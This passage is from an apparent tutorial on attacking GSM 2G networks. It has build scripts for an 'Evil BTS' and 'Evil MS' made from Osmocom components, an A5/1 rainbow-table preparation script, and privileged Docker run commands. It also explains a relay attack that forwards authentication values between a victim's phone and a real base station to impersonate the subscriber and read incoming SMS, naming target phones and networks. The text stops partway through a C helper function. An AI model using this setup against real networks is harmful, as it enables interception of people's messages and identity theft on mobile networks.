<span id="cb22-30"><a href="#cb22-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-31"><a href="#cb22-31" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb22-32"><a href="#cb22-32" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmocom-bb/src</span>
<span id="cb22-33"><a href="#cb22-33" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fixeria/trxcon</span>
<span id="cb22-34"><a href="#cb22-34" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> nofirmware</span>
<span id="cb22-35"><a href="#cb22-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-36"><a href="#cb22-36" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb22-37"><a href="#cb22-37" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-abis</span>
<span id="cb22-38"><a href="#cb22-38" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-abis</span>
<span id="cb22-39"><a href="#cb22-39" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb22-40"><a href="#cb22-40" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--disable-dahdi</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb22-41"><a href="#cb22-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-42"><a href="#cb22-42" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb22-43"><a href="#cb22-43" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-netif</span>
<span id="cb22-44"><a href="#cb22-44" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-netif</span>
<span id="cb22-45"><a href="#cb22-45" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.6.0</span>
<span id="cb22-46"><a href="#cb22-46" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb22-47"><a href="#cb22-47" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb22-48"><a href="#cb22-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-49"><a href="#cb22-49" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> bsc-2rfa/openbsc</span>
<span id="cb22-50"><a href="#cb22-50" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span></span>
<span id="cb22-51"><a href="#cb22-51" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../..</span>
<span id="cb22-52"><a href="#cb22-52" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmo-bts</span>
<span id="cb22-53"><a href="#cb22-53" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> osmo-bts</span>
<span id="cb22-54"><a href="#cb22-54" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb22-55"><a href="#cb22-55" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--enable-trx</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb22-56"><a href="#cb22-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-57"><a href="#cb22-57" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install ruby-libxml ruby-dev ruby-dbus</span>
<span id="cb22-58"><a href="#cb22-58" aria-hidden="true" tabindex="-1"></a><span class="ex">gem</span> install serial smartcard</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="installing-ms-evil-1" class="level1">
<h1>Installing MS-Evil</h1>
<div class="sourceCode" id="cb23"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /heartbreaker</span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /heartbreaker</span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install autoconf-archive libdbd-sqlite3 gcc-9 g++-9 gcc-10 g++-10 git autoconf pkg-config libtool build-essential libtalloc-dev libpcsclite-dev gnutls-dev python2 python2-dev fftw3-dev libsctp-dev libdbi-dev <span class="at">-y</span></span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /usr/bin/python2 /usr/bin/python</span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-9 90 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-9</span>
<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-10 100 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-10</span>
<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmocore.git</span>
<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span>  libosmocore</span>
<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.9.0</span>
<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ..</span>
<span id="cb23-18"><a href="#cb23-18" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmo-dsp.git</span>
<span id="cb23-19"><a href="#cb23-19" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-dsp</span>
<span id="cb23-20"><a href="#cb23-20" aria-hidden="true" tabindex="-1"></a><span class="ex">libtoolize</span> <span class="kw">&amp;&amp;</span> <span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb23-21"><a href="#cb23-21" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span></span>
<span id="cb23-22"><a href="#cb23-22" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb23-23"><a href="#cb23-23" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb23-24"><a href="#cb23-24" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb23-25"><a href="#cb23-25" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb23-26"><a href="#cb23-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-27"><a href="#cb23-27" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> ../bb-2rfa/src</span>
<span id="cb23-28"><a href="#cb23-28" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> nofirmware</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="a51-cracking" class="level1">
<h1><strong>A5/1 Cracking</strong></h1>
<p>Download the tables :</p>
<p><a href="https://infocon.org/rainbow%20tables/A51/">a51_tables</a></p>
<p>Prepare them :</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="va">offset_total</span><span class="op">=</span>0</span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> 0 <span class="op">&gt;</span> test</span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> abblay <span class="kw">in</span> <span class="va">$echo</span> <span class="va">$(</span><span class="fu">ls</span> /media/<span class="va">$USER</span>/tables<span class="va">)</span> <span class="kw">;</span> <span class="cf">do</span> <span class="va">abblay2</span><span class="op">=</span><span class="va">$(</span><span class="bu">echo</span> <span class="va">$abblay</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">'s/.dlt//g'</span><span class="va">)</span><span class="kw">;</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /media/<span class="va">$USER</span>/indexes/</span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="ex">/media/</span><span class="va">$USER</span><span class="ex">/indexes/kraken/TableConvert/TableConvert</span> di /media/<span class="va">$USER</span>/tables/<span class="va">$abblay2</span>.dlt <span class="va">$abblay2</span>.ins:<span class="va">$offset_total</span> <span class="va">$abblay2</span>.idx</span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="va">taille_arrondie</span><span class="op">=</span><span class="va">$(</span><span class="bu">echo</span> <span class="va">$((</span> <span class="va">$((</span> <span class="va">$(</span><span class="fu">stat</span> <span class="at">-c%s</span> <span class="va">$abblay2</span>.ins<span class="va">)</span><span class="op">/</span><span class="dv">4096</span> <span class="va">))</span> <span class="op">+</span><span class="dv">1</span> <span class="va">))</span> <span class="pp">*</span>4096 <span class="kw">|</span> <span class="fu">bc</span><span class="va">)</span></span>
<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a><span class="va">offset_total</span><span class="op">=</span><span class="va">$(($taille_arrondie</span> <span class="op">+</span> <span class="va">$offset_total))</span></span>
<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$taille_arrondie</span> <span class="op">&gt;&gt;</span> test</span>
<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a><span class="fu">awk</span> <span class="st">'{S+=$0}{print S}END{}'</span> test <span class="op">&gt;</span> offsets</span>
<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone http://jenda.hrach.eu/p/deka</span>
<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/0x7678/typhon-vx/tree/master/kraken</span>
<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> add-apt-repository ppa:deadsnakes/ppa</span>
<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update</span>
<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install python3.7 python3.7-dev nvidia-utils-515-server xserver-xorg-video-nvidia-515</span>
<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python3.7 <span class="at">-m</span> pip install pyopencl numpy scipy</span>
<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> deka</span>
<span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a><span class="ex">./genkernel64.sh</span> <span class="op">&gt;</span> slice.c</span>
<span id="cb24-20"><a href="#cb24-20" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="at">-e</span> <span class="st">'s/3.5m/3.7m/g'</span> Makefile</span>
<span id="cb24-21"><a href="#cb24-21" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>newpage <a href="https://www.youtube.com/watch?v=gHKmmVZAaFo">Redirection Attack</a></p>
<p>And it does !</p>
<p>Then what to do ? We know how to be a BTS in front of a MS and force the UE (User Equipement : 4G phone) to fallback into 2G.</p>
<p>Hey ! We gonna pretend that we are the MS in front of the BTS !</p>
<section id="hacking-2g-bts-1" class="level2">
<h2 class="anchored" data-anchor-id="hacking-2g-bts-1">Hacking 2G BTS</h2>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><img src="test3.png" class="img-fluid figure-img"></p>
<figcaption class="figure-caption">Attack Flow</figcaption>
</figure>
</div>
<p>The UE has become an MS again and we know how to be a BTS !</p>
<p>But even in the BTS does not authenticate MS does in front of the BTS. How can we bypass this ? By respecting the attack flow above ;)</p>
<p>I mean the secret is the key Ki stored on the SIM even with physical access you can’t crack it thanks to the chip inventor ! But we can fool the authentication process : The original process is :</p>
<ul>
<li>The BTS send a rand,key_sequence to the MS.</li>
<li>The MS respond SRes = f(ki,rand)</li>
<li>The MS cipher the communication with Kc= f(Ki,rand,key_seq)</li>
</ul>
<p>The hacked process is : - The genuine BTS send a rand,key_seq to the Evil MS. - The Evil MS send it to our Evil BTS via socket between Evil BTS server and Evil MS client. - The Evil BTS send the rand,key_seq to genuine MS - The Genuine MS respond sres -&gt; Evil BTS -&gt; Evil MS -&gt; Genuine BTS - In the example video Kc is forwarded between Genuine MS-&gt; Evil MS</p>
<p><a href="https://www.youtube.com/watch?v=gHKmmVZAaFo">Impersonnate PoC</a></p>
<p>With french explanations ;) sorry…</p>
<p><a href="https://www.youtube.com/watch?v=gHKmmVZAaFo">Impersonalisaion (français)</a></p>
<p>With english explanation (now ;) <a href="https://www.youtube.com/watch?v=rSGA4oFsFrQ">Impersonate (english)</a></p>
<p>https://imgur.com/lUjkpGp First of all there is a bug with brltty so</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> remove brltty</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>on host (not on docker !) Launch 1st</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> docker run <span class="at">-it</span> <span class="at">--privileged</span> <span class="at">--user</span> root <span class="at">--cap-add</span> ALL  <span class="at">-v</span> /dev/bus/usb:/dev/bus/usb bastienbaranoff/ms-final:hell_yeah</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Launch 2nd</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> docker run <span class="at">-it</span> <span class="at">--privileged</span> <span class="at">--user</span> root <span class="at">--cap-add</span> ALL  <span class="at">-v</span> /dev/bus/usb:/dev/bus/usb bastienbaranoff/bts-final:hell_yeah</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>In this order cause need ip 172.17.0.2 for ms and 172.17.0.3 for bts (socket are made to work with theses addresses)</p>
<p>in bts</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">tmux</span></span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="ex">service</span> pcscd start</span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="ex">./evil-bts.sh</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>` then in ms :</p>
<div class="sourceCode" id="cb29"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">tmux</span></span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /</span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> trx.sh</span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ctrl-b</span> c </span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="ex">./evil-ms.sh</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>set IMSI in OpenBSC (via telnet) and in /root/.osmocom/bb/mobile.cfg and set any ki but set one in OpenBSC need a motorola c1** and a sim reader</p>
<p>What happen next ?</p>
<p><a href="https://brmlab.cz/project/gsm/deka/attack-implementation">Crack A5/1</a></p>
<p>5s to crack it before the Kc ciphered channel timeout has been gone and if it is done we have incomming SMS.</p>
<p>Targets android &lt; 12, telco 2G until 2025 in France</p>
<p>Thank for reading !</p>
</section>
<section id="clients-servers-architecture-1" class="level2">
<h2 class="anchored" data-anchor-id="clients-servers-architecture-1">Clients-servers architecture :</h2>
<pre><code>bsc-2rfa 172.17.0.2
server rand 888 listen on 0.0.0.0
client sres 666 -&gt; 172.17.0.3

bb-2rfa 172.17.0.3
client rand 888 -&gt; 172.17.0.2
server sres 666 listen on 0.0.0.0
server kc 777 listen on 0.0.0.0

osmocom-genuine-ms 172.17.0.2
client kc 777 -&gt; 172.17.0.3</code></pre>
</section>
<section id="headers" class="level2">
<h2 class="anchored" data-anchor-id="headers">Headers :</h2>
<p>suppress_space.h</p>
<div class="sourceCode" id="cb31"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> res<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span><span class="op">*</span> spaces<span class="op">(</span><span class="dt">char</span> str <span class="op">[])</span></span>
<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span><span class="dt">int</span> j <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a>       <span class="cf">while</span> <span class="op">(</span>str<span class="op">[</span>i<span class="op">]</span> <span class="op">!=</span> <span class="ch">'</span><span class="sc">\0</span><span class="ch">'</span><span class="op">)</span></span>
<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a>       <span class="op">{</span></span>
<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a>          <span class="cf">if</span> <span class="op">((</span>str<span class="op">[</span>i<span class="op">]</span> <span class="op">==</span> <span class="ch">' '</span><span class="op">)</span> <span class="op">!=</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a>            res<span class="op">[</span>j<span class="op">]</span> <span class="op">=</span> str<span class="op">[</span>i<span class="op">];</span></span>
<span id="cb31-10"><a href="#cb31-10" aria-hidden="true" tabindex="-1"></a>            j<span class="op">++;</span></span>
<span id="cb31-11"><a href="#cb31-11" aria-hidden="true" tabindex="-1"></a>          <span class="op">}</span></span>
<span id="cb31-12"><a href="#cb31-12" aria-hidden="true" tabindex="-1"></a>          i<span class="op">++;</span></span>
<span id="cb31-13"><a href="#cb31-13" aria-hidden="true" tabindex="-1"></a>       <span class="op">}</span></span>
<span id="cb31-14"><a href="#cb31-14" aria-hidden="true" tabindex="-1"></a>       res<span class="op">[</span>j<span class="op">]</span> <span class="op">=</span> <span class="ch">'</span><span class="sc">\0</span><span class="ch">'</span><span class="op">;</span></span>
<span id="cb31-15"><a href="#cb31-15" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> res<span class="op">;}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>hex.h</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="co"> * Read hex strings and output as text.</span></span>
<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="co"> *</span></span>
<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * No checking of the characters is done, but the strings must have an even</span></span>
<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * length.</span></span>
<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="co"> *</span></span>
<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a><span class="co"> * $Id: hex2ascii.c,v 1.1 2009/09/19 23:56:49 grog Exp $</span></span>
<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">"suppress_space.h"</span></span>
<span id="cb32-14"><a href="#cb32-14" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> hexdigit <span class="op">(</span><span class="dt">char</span> c<span class="op">)</span></span>
<span id="cb32-15"><a href="#cb32-15" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb32-16"><a href="#cb32-16" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> outc<span class="op">;</span></span>
<span id="cb32-17"><a href="#cb32-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-18"><a href="#cb32-18" aria-hidden="true" tabindex="-1"></a>  outc <span class="op">=</span> c <span class="op">-</span><span class="ch">'0'</span><span class="op">;</span></span>
<span id="cb32-19"><a href="#cb32-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>outc <span class="op">&gt;</span> <span class="dv">9</span><span class="op">)</span>                                 <span class="co">/* A - F or a - f */</span></span>
<span id="cb32-20"><a href="#cb32-20" aria-hidden="true" tabindex="-1"></a>    outc <span class="op">-=</span> <span class="dv">7</span><span class="op">;</span>                                  <span class="co">/* A - F */</span></span>
<span id="cb32-21"><a href="#cb32-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>outc <span class="op">&gt;</span> <span class="dv">15</span><span class="op">)</span>                                <span class="co">/* a - f? */</span></span>
<span id="cb32-22"><a href="#cb32-22" aria-hidden="true" tabindex="-1"></a>    outc <span class="op">-=</span> <span class="dv">32</span><span class="op">;</span></span>
<span id="cb32-23"><a href="#cb32-23" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">((</span>outc <span class="op">&gt;</span> <span class="dv">15</span><span class="op">)</span> <span class="op">||</span> <span class="op">(</span>outc <span class="op">&lt;</span> <span class="dv">0</span><span class="op">))</span></span>
<span id="cb32-24"><a href="#cb32-24" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb32-25"><a href="#cb32-25" aria-hidden="true" tabindex="-1"></a>    fprintf <span class="op">(</span>stderr<span class="op">,</span> <span class="st">"Invalid character </span><span class="sc">%c</span><span class="st">, aborting</span><span class="sc">\n</span><span class="st">"</span><span class="op">,</span> c<span class="op">);</span></span>
<span id="cb32-26"><a href="#cb32-26" aria-hidden="true" tabindex="-1"></a>    exit <span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb32-27"><a href="#cb32-27" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb32-28"><a href="#cb32-28" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> outc<span class="op">;</span></span>
<span id="cb32-29"><a href="#cb32-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb32-30"><a href="#cb32-30" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> ascii<span class="op">[</span><span class="dv">17</span><span class="op">];</span></span>
<span id="cb32-31"><a href="#cb32-31" aria-hidden="true" tabindex="-1"></a><span class="dt">const</span> <span class="dt">unsigned</span> <span class="dt">char</span><span class="op">*</span> hex2ascii<span class="op">(</span><span class="dt">char</span> hexval<span class="op">[])</span></span>
<span id="cb32-32"><a href="#cb32-32" aria-hidden="true" tabindex="-1"></a><span class="op">{</span>  <span class="dt">int</span> arg<span class="op">;</span></span>
<span id="cb32-33"><a href="#cb32-33" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>c<span class="op">=</span>spaces<span class="op">(</span>hexval<span class="op">);</span></span>
<span id="cb32-34"><a href="#cb32-34" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> sl<span class="op">;</span></span>
<span id="cb32-35"><a href="#cb32-35" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> oc<span class="op">;</span></span>
<span id="cb32-36"><a href="#cb32-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-37"><a href="#cb32-37" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span>arg <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> arg <span class="op">&lt;</span> <span class="dv">17</span><span class="op">;</span> arg<span class="op">++)</span></span>
<span id="cb32-38"><a href="#cb32-38" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb32-39"><a href="#cb32-39" aria-hidden="true" tabindex="-1"></a>    sl <span class="op">=</span> strlen <span class="op">(</span>c<span class="op">);</span></span>
<span id="cb32-40"><a href="#cb32-40" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>sl <span class="op">&amp;</span> <span class="dv">1</span><span class="op">)</span>                                 <span class="co">/* odd length */</span></span>
<span id="cb32-41"><a href="#cb32-41" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb32-42"><a href="#cb32-42" aria-hidden="true" tabindex="-1"></a>      fprintf <span class="op">(</span>stderr<span class="op">,</span></span>
<span id="cb32-43"><a href="#cb32-43" aria-hidden="true" tabindex="-1"></a>               <span class="st">"</span><span class="sc">%s</span><span class="st"> is </span><span class="sc">%d</span><span class="st"> chars long, must be even</span><span class="sc">\n</span><span class="st">"</span><span class="op">,</span></span>
<span id="cb32-44"><a href="#cb32-44" aria-hidden="true" tabindex="-1"></a>               c<span class="op">,</span></span>
<span id="cb32-45"><a href="#cb32-45" aria-hidden="true" tabindex="-1"></a>               sl <span class="op">);</span></span>
<span id="cb32-46"><a href="#cb32-46" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> <span class="st">"prout"</span><span class="op">;</span></span>
